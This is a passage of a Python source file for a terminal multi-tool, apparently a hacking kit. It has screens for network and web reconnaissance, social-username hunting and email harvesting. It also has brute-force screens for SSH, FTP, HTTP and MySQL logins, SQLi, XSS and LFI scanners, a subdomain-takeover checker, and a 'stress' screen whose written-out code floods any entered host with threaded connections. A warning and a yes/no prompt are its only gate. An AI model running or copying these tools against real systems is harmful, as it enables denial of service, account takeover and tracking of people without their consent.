def dns_screen():
    clear(); print_banner(); header(LI(5))
    target=ask_target()
    if not target: return
    info=dns_lookup(target)
    print(p("bold",f"\n  ┌─ DNS: {target}"))
    if "error" in info: print(p("warn",f"  │  {info['error']}"))
    else:
        print(f"  │  {p('warn','IP          :')} {p('success',info.get('ip','?'))}")
        if info.get("reverse"): print(f"  │  {p('warn','Reverse DNS :')} {info['reverse']}")
        ips=info.get("all_ips",[])
        if len(ips)>1: print(f"  │  {p('warn','All IPs     :')} {', '.join(ips)}")
    print(p("bold","  └"+"─"*45))
    add_to_history(LI(5),target,info.get("ip","?")); pause()

def whois_screen():
    clear(); print_banner(); header(LI(6))
    target=ask_target()
    if not target: return
    print(p("info",f"\n  WHOIS {target}...\n"))
    result=whois_lookup(target)
    keys=["domain name","registrar","creation date","expiry date","updated date",
          "name server","country","org","netname","descr"]
    printed=set()
    for line in result.split("\n"):
        for key in keys:
            if key in line.lower() and line not in printed:
                parts=line.split(":",1)
                if len(parts)==2:
                    print(f"  {p('warn',parts[0].strip()+'  :')} {p('success',parts[1].strip())}")
                    printed.add(line); break
    add_to_history(LI(6),target,L('done')); pause()

def asn_screen():
    clear(); print_banner(); header(LI(7))
    ip=ask_ip()
    if not ip: pause(); return
    asn=get_asn_info(ip)
    print(p("bold",f"\n  ┌─ ASN: {ip}"))
    for k,v in asn.items(): print(f"  │  {p('warn',k+'  :')} {p('success',v)}")
    print(p("bold","  └"+"─"*45))
    add_to_history(LI(7),ip,L('done')); pause()

def arp_screen():
    clear(); print_banner(); header(LI(8))
    entries=get_arp_table()
    print(p("bold",f"\n  ┌─ ARP"))
    print(p("bold",f"  │  {'IP':<20}{'MAC':<20}VENDOR"))
    print(sep())
    for e in entries:
        if "error" in e: print(p("warn",f"  │  {e['error']}"))
        else: print(f"  │  {p('success',e.get('ip','?')):<32}{p('dim',e.get('mac','?')):<28}{p('warn',e.get('vendor','?'))}")
    print(p("bold","  └"+"─"*50))
    add_to_history(LI(8),"local",f"{len(entries)}"); pause()

def http_screen():
    clear(); print_banner(); header(LI(9))
    target=ask_target()
    if not target: return
    port,use_https=get_port_https()
    resp=get_http_headers(target,port,use_https)
    if not resp["ok"]: print(p("warn",f"  Error: {resp.get('error','?')}")); pause(); return
    headers=resp.get("headers",{})
    sec=["server","x-powered-by","x-frame-options","content-security-policy",
         "strict-transport-security","x-xss-protection","x-content-type-options"]
    print(p("bold",f"\n  ┌─ HTTP {resp['status']}: {target}:{port}"))
    for k,v in headers.items():
        col="primary" if k.lower() in sec else "dim"
        print(f"  │  {p(col,k+'  :')} {str(v)[:80]}")
    missing=[h for h in ["x-frame-options","content-security-policy",
                          "strict-transport-security","x-content-type-options"]
             if h not in {k.lower() for k in headers}]
    if missing:
        print(p("warn","\n  Missing security headers:"))
        for h in missing: print(p("warn",f"  ⚠  {h}"))
    techs=detect_technologies(target,port,use_https)
    if techs:
        print(p("bold","\n  ┌─ Technologies"))
        for cat,tech in techs: print(f"  │  {p('warn',cat+'  :')} {p('success',tech)}")
    add_to_history(LI(9),target,f"status {resp['status']}"); pause()

def ssl_screen():
    clear(); print_banner(); header(LI(10))
    target=ask_target()
    if not target: return
    port_in=input(p("info","  Port [443]: ")).strip()
    port=int(port_in) if port_in.isdigit() else 443
    info=check_ssl(target,port)
    if not info["ok"]: print(p("warn",f"  Error: {info.get('error','?')}")); pause(); return
    cert=info.get("cert",{})
    print(p("bold",f"\n  ┌─ SSL: {target}"))
    if cert:
        subj=dict(x[0] for x in cert.get("subject",[]))
        iss=dict(x[0] for x in cert.get("issuer",[]))
        print(f"  │  {p('warn','CN          :')} {p('success',subj.get('commonName','?'))}")
        print(f"  │  {p('warn','Issuer      :')} {iss.get('commonName','?')}")
        print(f"  │  {p('warn','Expires     :')} {p('primary',cert.get('notAfter','?'))}")
        sans=cert.get("subjectAltName",[])
        if sans: print(f"  │  {p('warn','SAN         :')} {p('dim',', '.join([v for _,v in sans[:6]]))}")
    cph=info.get("cipher")
    if cph: print(f"  │  {p('warn','Cipher      :')} {cph[0]}")
    print(f"  │  {p('warn','TLS         :')} {p('success',info.get('version','?'))}")
    print(p("bold","  └"+"─"*45))
    add_to_history(LI(10),target,L('done')); pause()

def subdomain_screen():
    clear(); print_banner(); header(LI(11))
    target=ask_target()
    if not target: return
    print(p("info","\n  Scanning...\n"))
    found=find_subdomains(target)
    print(p("bold",f"\n  ┌─ Subdomains: {target}"))
    if not found: print(p("dim",f"  │  {L('not_found')}"))
    else:
        for s in sorted(found,key=lambda x:x["sub"]):
            print(f"  │  {p('success',s['sub']):<50}{p('warn',s['ip'])}")
    print(p("bold","  └"+"─"*52))
    print(p("info",f"\n  {L('found')}: {len(found)}"))
    add_to_history(LI(11),target,f"{len(found)}"); pause()

def emails_screen():
    clear(); print_banner(); header(LI(12))
    target=ask_target()
    if not target: return
    port,use_https=get_port_https()
    emails=find_emails_in_page(target,port,use_https)
    print(p("bold","\n  ┌─ Emails"))
    if not emails: print(p("dim",f"  │  {L('not_found')}"))
    else:
        for e in emails: print(f"  │  {p('success','@')} {p('warn',e)}")
    print(p("bold","  └"+"─"*45))
    add_to_history(LI(12),target,f"{len(emails)}"); pause()

def robots_screen():
    clear(); print_banner(); header(LI(13))
    target=ask_target()
    if not target: return
    port,use_https=get_port_https()
    found=get_robots_sitemap(target,port,use_https)
    if not found: print(p("dim",f"\n  {L('not_found')}"))
    else:
        for path,content in found.items():
            print(p("bold",f"\n  ┌─ {path}"))
            for line in content.strip().split("\n")[:20]:
                if line.strip():
                    print(p("success" if "Disallow" in line else "dim",f"  │  {line}"))
            print(p("bold","  └"+"─"*45))
    add_to_history(LI(13),target,f"{len(found)}"); pause()

def dorks_screen():
    clear(); print_banner(); header(LI(14))
    target=input(p("info","  Domain (example.com): ")).strip()
    if not target: return
    dorks=generate_dorks(target)
    print(p("bold",f"\n  ┌─ Google Dorks: {target}"))
    for query,desc in dorks:
        print(f"  │  {p('success',query)}")
        print(p("dim",f"  │    ↳ {desc}"))
    print(p("bold","  └"+"─"*55))
    print(p("info",f"\n  Copy and paste into Google: https://google.com"))
    add_to_history(LI(14),target,f"{len(dorks)} dorks"); pause()

def username_screen():
    clear(); print_banner(); header(LI(15))
    username=input(p("info","  Username: ")).strip()
    if not username: return
    print(p("info",f"\n  Hunting '{username}' on {len(SOCIAL_SITES)} platforms...\n"))
    found=hunt_username(username)
    print(p("bold",f"\n  ┌─ Results for '{username}'"))
    if not found: print(p("dim",f"  │  {L('not_found')}"))
    else:
        for r in found:
            print(f"  │  {p('success','[+]')} {p('warn',r['site']+'  :')} {p('dim',r['url'])}")
    print(p("bold","  └"+"─"*55))
    print(p("info",f"\n  {L('found')}: {len(found)}/{len(SOCIAL_SITES)}"))
    add_to_history(LI(15),username,f"{len(found)} accounts"); pause()

def metadata_screen():
    clear(); print_banner(); header(LI(16))
    filepath=input(p("info","  File path (PDF/DOCX/JPG): ")).strip()
    if not filepath or not os.path.exists(filepath):
        print(p("warn","  File not found.")); pause(); return
    meta=extract_metadata(filepath)
    print(p("bold",f"\n  ┌─ Metadata: {os.path.basename(filepath)}"))
    if not meta: print(p("dim",f"  │  {L('not_found')}"))
    else:
        for k,v in meta.items(): print(f"  │  {p('warn',k+'  :')} {p('success',str(v))}")
    print(p("bold","  └"+"─"*50))
    add_to_history(LI(16),filepath,f"{len(meta)} fields"); pause()

def wayback_screen():
    clear(); print_banner(); header(LI(17))
    domain=input(p("info","  Domain: ")).strip()
    if not domain: return
    print(p("info",f"\n  Checking Wayback Machine for {domain}...\n"))
    snap=wayback_lookup(domain)
    if snap:
        print(p("bold","  ┌─ Wayback Machine"))
        print(f"  │  {p('warn','Status    :')} {p('success',snap.get('status','?'))}")
        print(f"  │  {p('warn','Available :')} {snap.get('available','?')}")
        print(f"  │  {p('warn','Timestamp :')} {snap.get('timestamp','?')}")
        url=snap.get('url','')
        if url: print(f"  │  {p('warn','URL       :')} {p('dim',url)}")
        print(p("bold","  └"+"─"*50))
        print(p("info",f"\n  Full history: https://web.archive.org/web/*/{domain}"))
    else:
        print(p("warn","  No snapshots found."))
    add_to_history(LI(17),domain,L('done')); pause()

def sysinfo_screen():
    clear(); print_banner(); header(LI(18))
    info=get_system_info()
    print(p("bold","\n  ┌─ System Information"))
    print(f"  │  {p('warn','OS       :')} {p('success',info['os'])}")
    print(f"  │  {p('warn','Hostname :')} {p('success',info['hostname'])}")
    print(f"  │  {p('warn','Local IP :')} {p('success',info['local_ip'])}")
    print(f"  │  {p('warn','Python   :')} {info['python']}")
    print(p("bold","  └"+"─"*50))
    if info.get("interfaces"):
        print(p("bold","\n  ┌─ Network interfaces"))
        for line in info["interfaces"].split("\n")[:20]:
            if line.strip(): print(p("dim",f"  │  {line}"))
        print(p("bold","  └"+"─"*50))
    add_to_history(LI(18),"self",L('done')); pause()

def targets_screen():
    clear(); print_banner(); header(LI(19))
    print(p("bold","  Saved targets:"))
    if not TARGETS: print(p("dim",f"  {L('empty')}"))
    else:
        for name,data in TARGETS.items():
            print(f"  {p('success',name+'  :')} {p('warn',data.get('ip','?'))} {p('dim',data.get('note',''))}")
    print(f"\n  {p('success','1')} Add  {p('success','2')} Remove  {p('success','3')} Scan target  {p('dim','Enter')} Back")
    ch=input(p("info","  Choice: ")).strip()
    if ch=="1":
        name=input(p("info","  Name: ")).strip()
        ip=input(p("info","  IP/Host: ")).strip()
        note=input(p("info","  Note (optional): ")).strip()
        if name and ip: TARGETS[name]={"ip":ip,"note":note}; print(p("success","  ✓ Saved"))
    elif ch=="2":
        name=input(p("info","  Name to remove: ")).strip()
        if name in TARGETS: del TARGETS[name]; print(p("success","  ✓ Removed"))
    elif ch=="3":
        name=input(p("info","  Target name: ")).strip()
        if name in TARGETS:
            host=TARGETS[name]["ip"]
            try:
                host_ip=socket.gethostbyname(host)
                results=scan_ports(host_ip,sorted(COMMON_PORTS.keys()))
                print_ports(host_ip,results)
                save_report_menu(host_ip,results)
            except: print(p("warn",L('resolv_err')))
    pause()

def my_location_screen():
    clear(); print_banner(); header(LI(20))
    print(p("info","  Getting your IP..."))
    my_ip=get_my_ip()
    if not my_ip: print(p("warn","  No connection.")); pause(); return
    print(p("success",f"  ● Your IP: {my_ip}\n"))
    geo=geolocate_ip(my_ip)
    if not geo: print(p("warn","  API unavailable.")); pause(); return
    lat,lon=geo.get('lat','?'),geo.get('lon','?')
    print(p("bold","\n  ┌─ My Location"))
    print(f"  │  {p('warn','IP          :')} {p('success',my_ip)}")
    print(f"  │  {p('warn','Country     :')} {geo.get('country','?')} ({geo.get('countryCode','?')})")
    print(f"  │  {p('warn','Region      :')} {geo.get('regionName','?')}")
    print(f"  │  {p('warn','City        :')} {geo.get('city','?')}")
    print(f"  │  {p('warn','Coordinates :')} {p('success',f'{lat}, {lon}')}")
    print(f"  │  {p('warn','ISP         :')} {geo.get('isp','?')}")
    print(f"  │  {p('warn','Org         :')} {geo.get('org','?')}")
    print(f"  │  {p('warn','Timezone    :')} {geo.get('timezone','?')}")
    print(p("bold","  └"+"─"*45))
    if lat!='?' and lon!='?':
        print(p("info",f"\n  Google Maps: https://www.google.com/maps?q={lat},{lon}"))
    add_to_history(LI(20),"self",geo.get('city','?')); pause()

def geo_ip_screen():
    clear(); print_banner(); header(LI(21))
    ip=input(p("info","  Enter IP: ")).strip()
    if not ip: return
    geo=geolocate_ip(ip)
    if not geo: print(p("warn","  Failed.")); pause(); return
    lat,lon=geo.get('lat','?'),geo.get('lon','?')
    print(p("bold",f"\n  ┌─ Geolocation: {ip}"))
    print(f"  │  {p('warn','Country     :')} {geo.get('country','?')} ({geo.get('countryCode','?')})")
    print(f"  │  {p('warn','City        :')} {geo.get('city','?')}")
    print(f"  │  {p('warn','Coordinates :')} {p('success',f'{lat}, {lon}')}")
    print(f"  │  {p('warn','ISP         :')} {geo.get('isp','?')}")
    print(f"  │  {p('warn','Org         :')} {geo.get('org','?')}")
    print(f"  │  {p('warn','Timezone    :')} {geo.get('timezone','?')}")
    print(p("bold","  └"+"─"*45))
    if lat!='?' and lon!='?':
        print(p("info",f"\n  Google Maps: https://www.google.com/maps?q={lat},{lon}"))
    add_to_history(LI(21),ip,geo.get('city','?')); pause()

def mac_vendor_screen():
    clear(); print_banner(); header(LI(22))
    mac=input(p("info","  MAC address (AA:BB:CC:DD:EE:FF): ")).strip()
    if not mac: return
    vendor=mac_vendor(mac)
    print(p("bold",f"\n  ┌─ MAC Vendor"))
    print(f"  │  {p('warn','MAC    :')} {p('success',mac.upper())}")
    print(f"  │  {p('warn','Vendor :')} {p('primary',vendor)}")
    print(p("bold","  └"+"─"*40))
    add_to_history(LI(22),mac,vendor); pause()

def brute_ssh_screen():
    clear(); print_banner(); header(LI(23))
    print(p("warn",f"\n  {L('only_own')}\n"))
    target=ask_target()
    if not target: return
    port_in=input(p("info","  Port [22]: ")).strip()
    port=int(port_in) if port_in.isdigit() else 22
    found=brute_ssh(target,port)
    if found:
        print(p("primary",f"\n  ✓ Found {len(found)}:"))
        for u,pw in found: print(p("success",f"  → {u}:{pw}"))
    else: print(p("dim",f"\n  {L('not_found')}"))
    add_to_history(LI(23),target,f"{len(found)}"); pause()

def brute_ftp_screen():
    clear(); print_banner(); header(LI(24))
    print(p("warn",f"\n  {L('only_own')}\n"))
    target=ask_target()
    if not target: return
    port_in=input(p("info","  Port [21]: ")).strip()
    port=int(port_in) if port_in.isdigit() else 21
    found=brute_ftp(target,port)
    if found:
        print(p("primary",f"\n  ✓ Found {len(found)}:"))
        for u,pw in found: print(p("success",f"  → {u}:{pw}"))
    else: print(p("dim",f"\n  {L('not_found')}"))
    add_to_history(LI(24),target,f"{len(found)}"); pause()

def brute_http_screen():
    clear(); print_banner(); header(LI(25))
    print(p("warn",f"\n  {L('only_own')}\n"))
    target=ask_target()
    if not target: return
    port,use_https=get_port_https()
    found=brute_http(target,port,use_https)
    if found:
        print(p("primary",f"\n  ✓ Found {len(found)}:"))
        for u,pw in found: print(p("success",f"  → {u}:{pw}"))
    else: print(p("dim",f"\n  {L('not_found')}"))
    add_to_history(LI(25),target,f"{len(found)}"); pause()

def brute_mysql_screen():
    clear(); print_banner(); header(LI(26))
    print(p("warn",f"\n  {L('only_own')}\n"))
    target=ask_target()
    if not target: return
    port_in=input(p("info","  Port [3306]: ")).strip()
    port=int(port_in) if port_in.isdigit() else 3306
    brute_mysql(target,port)
    add_to_history(LI(26),target,"done"); pause()

def dir_brute_screen():
    clear(); print_banner(); header(LI(27))
    target=ask_target()
    if not target: return
    port,use_https=get_port_https()
    print(p("info",f"\n  Directory brute on {target}:{port}...\n"))
    found=dir_brute(target,port,use_https)
    print(p("bold",f"\n  ┌─ Directories found: {target}"))
    if not found: print(p("dim",f"  │  {L('not_found')}"))
    else:
        print(p("bold",f"  │  {'PATH':<35}CODE"))
        print(sep())
        for r in sorted(found,key=lambda x:x["code"]):
            col="success" if r["code"]==200 else("warn" if r["code"] in [301,302] else "primary")
            print(f"  │  {p(col,r['path']):<47}{p('dim',str(r['code']))}")
    print(p("bold","  └"+"─"*52))
    print(p("info",f"\n  {L('found')}: {len(found)}"))
    add_to_history(LI(27),target,f"{len(found)}"); pause()

def sqli_screen():
    clear(); print_banner(); header(LI(28))
    target=ask_target()
    if not target: return
    port,use_https=get_port_https()
    vuln=sqli_scan(target,port,use_https)
    if vuln:
        print(p("primary",f"\n  ⚠  {len(vuln)} vulnerabilities found!"))
        for v in vuln:
            print(p("warn",f"  → {v['url'][:70]}"))
            print(p("dim",f"    Payload: {v['payload']}  |  Error: {v['error']}"))
    else: print(p("success","\n  ✓ No SQLi found."))
    add_to_history(LI(28),target,"vuln" if vuln else "clean"); pause()

def xss_screen():
    clear(); print_banner(); header(LI(29))
    target=ask_target()
    if not target: return
    port,use_https=get_port_https()
    vuln=xss_scan(target,port,use_https)
    if vuln:
        print(p("primary",f"\n  ⚠  {len(vuln)} XSS found!"))
        for v in vuln:
            print(p("warn",f"  → {v['url'][:70]}"))
            print(p("dim",f"    Payload: {v['payload'][:50]}"))
    else: print(p("success","\n  ✓ No XSS found."))
    add_to_history(LI(29),target,"vuln" if vuln else "clean"); pause()

def lfi_screen():
    clear(); print_banner(); header(LI(30))
    target=ask_target()
    if not target: return
    port,use_https=get_port_https()
    print(p("info",f"\n  LFI scan {target}:{port}...\n"))
    vuln=lfi_scan(target,port,use_https)
    if vuln:
        print(p("primary",f"\n  ⚠  {len(vuln)} LFI found!"))
        for v in vuln:
            print(p("warn",f"  → {v['url'][:70]}"))
            print(p("dim",f"    Signature: {v['sig']}"))
    else: print(p("success","\n  ✓ No LFI found."))
    add_to_history(LI(30),target,"vuln" if vuln else "clean"); pause()

def takeover_screen():
    clear(); print_banner(); header(LI(31))
    domain=input(p("info","  Domain (example.com): ")).strip()
    if not domain: return
    print(p("info",f"\n  Checking subdomain takeover for {domain}...\n"))
    vuln=subdomain_takeover(domain)
    if vuln:
        print(p("primary",f"\n  ⚠  {len(vuln)} potential takeovers!"))
        for v in vuln:
            print(f"  {p('warn','['+v['risk']+']')} {p('success',v['sub'])} → {p('dim',v['service'])}")
    else: print(p("success","\n  ✓ No takeover candidates found."))
    add_to_history(LI(31),domain,f"{len(vuln)} found"); pause()

def stress_screen():
    clear(); print_banner(); header(LI(32))
    target=ask_target()
    if not target: return
    try: host_ip=socket.gethostbyname(target)
    except: print(p("warn",L('resolv_err'))); pause(); return
    port_in=input(p("info","  Port [80]: ")).strip()
    port=int(port_in) if port_in.isdigit() else 80
    dur_in=input(p("info","  Duration sec [10]: ")).strip()
    dur=int(dur_in) if dur_in.isdigit() else 10
    thr_in=input(p("info","  Threads [50]: ")).strip()
    thr=int(thr_in) if thr_in.isdigit() else 50
    print(p("warn",f"\n  {L('only_own')}"))
    confirm=input(p("info",f"  {L('confirm')}")).strip().lower()
    if confirm not in ("да","yes","д","y","ha"): print(p("dim","  Cancelled.")); pause(); return
    stats={"sent":0,"errors":0}; stop=threading.Event()
    def worker():
        while not stop.is_set():
            try:
                with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    if s.connect_ex((host_ip,port))==0:
                        s.send(b"GET / HTTP/1.0\r\n\r\n"); stats["sent"]+=1
            except: stats["errors"]+=1
    ts=[threading.Thread(target=worker,daemon=True) for _ in range(thr)]
    for t in ts: t.start()
    start=time.time()
    while time.time()-start<dur:
        elapsed=time.time()-start
        rps=stats["sent"]/(elapsed or 1)
        rps_s=f"{rps:.0f}"
        print(f"  Sent: {p('success',str(stats['sent']))}  Errors: {p('warn',str(stats['errors']))}  RPS: {p('info',rps_s)}  {elapsed:.1f}/{dur}s", end="\r")
        time.sleep(0.3)
    stop.set()
    for t in ts: t.join(timeout=2)
    print()
    print(p("bold",f"\n  Total sent: {stats['sent']}  Errors: {stats['errors']}"))
    add_to_history(LI(32),target,f"{stats['sent']} req"); pause()

def blacklist_screen():
    clear(); print_banner(); header(LI(33))
    ip=ask_ip()
    if not ip: pause(); return
    print(p("info",f"\n  Checking {ip} in blacklists...\n"))
    listed=check_blacklists(ip)
    if listed:
        print(p("primary",f"  ⚠  Found in {len(listed)} blacklists:"))
        for bl in listed: print(p("warn",f"  → {bl}"))
    else: print(p("success","  ✓ Clean."))
    add_to_history(LI(33),ip,"listed" if listed else "clean"); pause()

def hibp_screen():
    clear(); print_banner(); header(LI(34))
    pwd=input(p("info","  Password to check: ")).strip()
    if not pwd: return
    print(p("info","\n  Checking HaveIBeenPwned...\n"))
    count=check_pwned_password(pwd)
    if count==-1: print(p("warn","  API unavailable."))
    elif count==0: print(p("success","  ✓ Not found in leaks. Strong password!"))
    else:
        print(p("primary",f"  ⚠  Found {count:,} times in data breaches!"))
        print(p("warn","  Change this password everywhere immediately!"))
    add_to_history(LI(34),"password",f"{count} leaks"); pause()

def monitor_screen():
    clear(); print_banner(); header(LI(35))
    target=ask_target()
    if not target: return
    try: host_ip=socket.gethostbyname(target)
    except: print(p("warn",L('resolv_err'))); pause(); return
    count_in=input(p("info","  Checks [10]: ")).strip()
    int_in=input(p("info","  Interval sec [5]: ")).strip()
    count=int(count_in) if count_in.isdigit() else 10
    interval=int(int_in) if int_in.isdigit() else 5
    results=monitor_host(host_ip,interval=interval,count=count)
    add_to_history(LI(35),target,f"{sum(1 for r in results if r['alive'])}/{count}"); pause()

def bandwidth_screen():
    clear(); print_banner(); header(LI(36))
    print(p("info","\n  Testing download speed...\n"))
    results=bandwidth_test()
    print(p("bold","\n  ┌─ Speed Test"))
    for r in results:
        if "error" in r: print(f"  │  {p('dim',r['server']+'  :')} {p('warn',r['error'])}")
        else:
            speed=r['mbps']; col="success" if speed>20 else("warn" if speed>5 else "primary")
            size_s=f"({r['size_mb']:.1f}MB in {r['time']:.1f}s)"
            print(f"  │  {p('warn',r['server']+'  :')} {p(col,f'{speed:.1f} Mbps')} {p('dim',size_s)}")
    print(p("bold","  └"+"─"*50))
    add_to_history(LI(36),"self",L('done')); pause()

def history_screen():
    clear(); print_banner(); header(LI(37))
    if not SCAN_HISTORY: print(p("dim",f"  {L('empty')}")); pause(); return
    print(p("bold",f"  {'#':<4}{'TIME':<10}{'ACTION':<20}{'TARGET':<25}RESULT"))
    print(sep(65))
    for i,h in enumerate(SCAN_HISTORY,1):
        print(f"  {p('dim',str(i)):<6}{p('dim',h['time']):<12}{p('info',h['action']):<28}{p('warn',h['target']):<33}{p('success',h['summary'])}")
    print(p("dim",f"\n  Total: {len(SCAN_HISTORY)}")); pause()

def settings_screen():
    global LANG
    clear(); print_banner(); header(L('settings_title'))
    print(f"  {p('warn','Theme      :')} {p('success',CFG.get('theme','red'))}")
    print(f"  {p('warn','Threads    :')} {CFG.get('threads',100)}")
    print(f"  {p('warn','Timeout    :')} {CFG.get('timeout',1.0)}s")
    print(f"  {p('warn','Language   :')} {LANG.upper()}")
    print(f"  {p('warn','Auto-report:')} {CFG.get('auto_report',False)}")
    print(f"  {p('warn','Sound      :')} {CFG.get('sound',False)}")
    aliases=CFG.get('aliases',{})
    if aliases:
        print(f"  {p('warn','Aliases    :')}")
        for k,v in aliases.items(): print(p("dim",f"    {k} → {v}"))
    print(f"\n  {p('success','1')} Theme  {p('success','2')} Threads  {p('success','3')} Timeout  {p('success','4')} Language")
    print(f"  {p('success','5')} Alias+  {p('success','6')} Alias-  {p('success','7')} Auto-report  {p('success','8')} Sound")
    ch=input(p("info",f"\n  {L('choice_prompt')}")).strip()
    if ch=="1":
        t=input(p("info",f"  {L('theme_prompt')}")).strip().lower()
        if t in THEMES: CFG["theme"]=t; save_config(CFG); print(p("success",f"  ✓ {L('changed')}"))
    elif ch=="2":
        v=input(p("info",f"  {L('threads_prompt')}")).strip()
        if v.isdigit(): CFG["threads"]=int(v); save_config(CFG); print(p("success","  ✓"))
    elif ch=="3":
        v=input(p("info",f"  {L('timeout_prompt')}")).strip()
        try: CFG["timeout"]=float(v); save_config(CFG); print(p("success","  ✓"))
        except: pass
    elif ch=="4":
        choose_language(); boot_sequence()
    elif ch=="5":
        n=input(p("info",f"  {L('alias_name')}")).strip()
        v=input(p("info",f"  {L('alias_val')}")).strip()
        if n and v: CFG.setdefault("aliases",{})[n]=v; save_config(CFG); print(p("success",f"  ✓ {n}→{v}"))
    elif ch=="6":
        n=input(p("info",f"  {L('alias_name')}")).strip()
        if n in CFG.get("aliases",{}): del CFG["aliases"][n]; save_config(CFG); print(p("success","  ✓"))
    elif ch=="7":
        CFG["auto_report"]=not CFG.get("auto_report",False); save_config(CFG)
        print(p("success",f"  {L('auto_rep')}: {CFG['auto_report']}"))
    elif ch=="8":
        CFG["sound"]=not CFG.get("sound",False); save_config(CFG)
        print(p("success",f"  {L('sound_lbl')}: {CFG['sound']}"))
    pause()

# ══════════════════════════════════════════════════════════════
#  МАРШРУТИЗАЦИЯ
# ══════════════════════════════════════════════════════════════
ROUTES = {
    "1":port_scan_screen,    "2":discover_screen,    "3":compare_screen,
    "4":ping_screen,         "5":traceroute_screen,  "6":dns_screen,
    "7":whois_screen,        "8":asn_screen,         "9":arp_screen,
    "10":http_screen,        "11":ssl_screen,        "12":subdomain_screen,
    "13":emails_screen,      "14":robots_screen,     "15":dorks_screen,
    "16":username_screen,    "17":metadata_screen,   "18":wayback_screen,
    "19":sysinfo_screen,     "20":targets_screen,    "21":my_location_screen,
    "22":geo_ip_screen,      "23":mac_vendor_screen, "24":brute_ssh_screen,
    "25":brute_ftp_screen,   "26":brute_http_screen, "27":brute_mysql_screen,
    "28":dir_brute_screen,   "29":sqli_screen,       "30":xss_screen,
    "31":lfi_screen,         "32":takeover_screen,   "33":stress_screen,
    "34":blacklist_screen,   "35":hibp_screen,       "36":monitor_screen,
    "37":bandwidth_screen,   "38":history_screen,    "39":settings_screen,
}

# ══════════════════════════════════════════════════════════════
#  СТАРТ
# ══════════════════════════════════════════════════════════════
def main():
    global LANG
    LANG = CFG.get("lang","ru")
    choose_language()
    boot_sequence()
    while True:
        clear(); print_banner()
        choice=main_menu()
        if choice in ROUTES:
            ROUTES[choice]()
        elif choice=="0":
            clear()
            print(p("primary",f"\n  {L('goodbye')}  {SITE}  |  dev: {AUTHOR}\n"))
            sys.exit(0)
        else:
            print(p("dim",L('invalid'))); time.sleep(0.8)

if __name__=="__main__":
    main()
